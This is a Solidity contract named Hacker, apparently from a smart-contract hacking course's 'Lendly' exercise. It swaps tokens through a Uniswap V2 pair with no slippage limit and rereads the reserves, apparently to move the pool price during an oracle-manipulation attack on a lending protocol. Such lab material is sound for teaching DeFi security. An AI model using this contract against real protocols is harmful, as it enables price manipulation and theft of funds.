pragma solidity 0.8.13;

import "../interfaces/IUniswapV2.sol";
import {IWETH9} from "../interfaces/IWETH9.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "hardhat/console.sol";

/**
 * @title Lendly
 * @author JohnnyTime (https://smartcontractshacking.com)
 */
contract Hacker {
    IUniswapV2Pair pair;
    IWETH9 weth;
    IERC20 dai;
    IUniswapV2Router01 router;

    address immutable UNISWAP_ROUTER_V2 =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    constructor(address _pair, address _weth, address _dai) {
        pair = IUniswapV2Pair(_pair);
        weth = IWETH9(_weth);
        dai = IERC20(_dai);
        router = IUniswapV2Router01(UNISWAP_ROUTER_V2);
    }

    function sell(address _tokenSent, uint _amountSent) external {
        address token0 = pair.token0();
        address token1 = pair.token1();

        uint amountOut;

        address[] memory path = new address[](2);

        (uint reserve0, uint reserve1, ) = pair.getReserves();

        if (_tokenSent == token0) {
            amountOut = router.quote(_amountSent, reserve0, reserve1);

            path[0] = _tokenSent;
            path[1] = token1;
        } else if (_tokenSent == token1) {
            amountOut = router.quote(_amountSent, reserve1, reserve0);

            path[0] = _tokenSent;
            path[1] = token0;
        } else {
            revert("Token not supported");
        }
        uint minAmount = 1;
        IERC20(_tokenSent).approve(UNISWAP_ROUTER_V2, _amountSent);

        router.swapExactTokensForTokens(
            _amountSent,
            minAmount,
            path,
            msg.sender,
            block.timestamp
        );

        (reserve0, reserve1, ) = pair.getReserves();
    }
}
